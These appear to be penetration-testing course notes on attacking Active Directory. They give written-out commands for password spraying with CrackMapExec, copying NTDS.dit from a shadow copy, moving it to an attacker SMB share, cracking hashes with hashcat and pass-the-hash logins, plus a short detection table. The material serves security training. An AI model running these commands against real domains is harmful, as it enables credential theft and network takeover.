🧠 Context Recap: What Is NTDS.dit?
The NTDS.dit is the Active Directory database:

Stores all domain user accounts and their password hashes.

Lives on domain controllers at:

makefile
Copy
Edit
C:\Windows\NTDS\NTDS.dit
To access it:

You need Domain Admin or local admin on a DC.

The file is locked during OS runtime, so we need Volume Shadow Copy (VSS) to grab it safely.

🏹 Phase 1: Initial AD Enumeration & Creds
Before dumping NTDS, you need:

A foothold on the internal network

A valid user credential, often obtained via:

Password spraying

LSASS dump

SAM dump

Phishing

CVEs

OSINT + brute/dictionary attack (CrackMapExec style)

🧪 AD Dictionary Attack Flow (with CrackMapExec)
bash
Copy
Edit
crackmapexec smb <DC-IP> -u <userlist.txt> -p <passlist.txt>
Example:

bash
Copy
Edit
crackmapexec smb 10.129.201.57 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt
✅ Successful login will be shown in green with [+]

❌ Failure will be marked with STATUS_LOGON_FAILURE

☠️ Be careful — you can trigger account lockouts if GPOs are in place (watch for event ID 4740 in logs)

🔥 Tip: Always craft your userlists carefully using tools like username-anarchy or even scraping PDFs, company emails, etc.

🧠 Phase 2: NTDS.dit Extraction
✅ Method 1: Manual Extraction w/ Evil-WinRM
Login to the DC

bash
Copy
Edit
evil-winrm -i <IP> -u <domain user> -p <password>
Create a VSS snapshot

powershell
Copy
Edit
vssadmin create shadow /for=C:
Copy the NTDS.dit from the snapshot

powershell
Copy
Edit
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
Transfer to your attack box

powershell
Copy
Edit
cmd.exe /c move C:\NTDS\NTDS.dit \\<attackerIP>\CompData
✅ Method 2: CrackMapExec One-Liner
bash
Copy
Edit
crackmapexec smb <DC-IP> -u <user> -p <pass> --ntds
Automatically does:

VSS snapshot

Copies NTDS.dit and SYSTEM

Dumps all the hashes

Logs results to ~/.cme/logs/

🧠 Includes NTLM, Kerberos keys, and even krbtgt (🧨 used for Golden Ticket attacks in later modules)

🧩 Bonus: Cracking or Using Hashes
🔓 Cracking NTLM Hash (same as SAM section):
bash
Copy
Edit
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
💀 Pass-The-Hash with Evil-WinRM:
bash
Copy
Edit
evil-winrm -i <IP> -u <user> -H <NTLM hash>
Even if you can’t crack it — you can often authenticate with the hash itself. This is the real power of NTLM and PTH.

🔍 Defender’s POV – Detection & Logging
Action	Event ID	Log Source
Dictionary attack	4771 or 4625	Security
VSS creation	513	System
NTDS.dit access	4663 (if auditing enabled)	Security
PTH Authentication	4624 w/ no pre-auth data	Security
🧠 TL;DR Flow – "Attacking AD + NTDS.dit"
text
Copy
Edit
[✓] Valid user or admin access? 
    → No → Spray / Enumerate / Dump LSASS / SAM / Phish

[✓] Foothold?
    → Yes → Evil-WinRM or CrackMapExec

[✓] Admin access to DC?
    → Yes → Proceed to dump NTDS.dit

Method 1 (manual):
    - Create VSS
    - Copy from \\?\GLOBALROOT\Device\...
    - Transfer over SMB

Method 2 (auto):
    - CME --ntds

[✓] Got hashes?
    → Crack with hashcat
    → Or Pass-the-Hash with Evil-WinRM
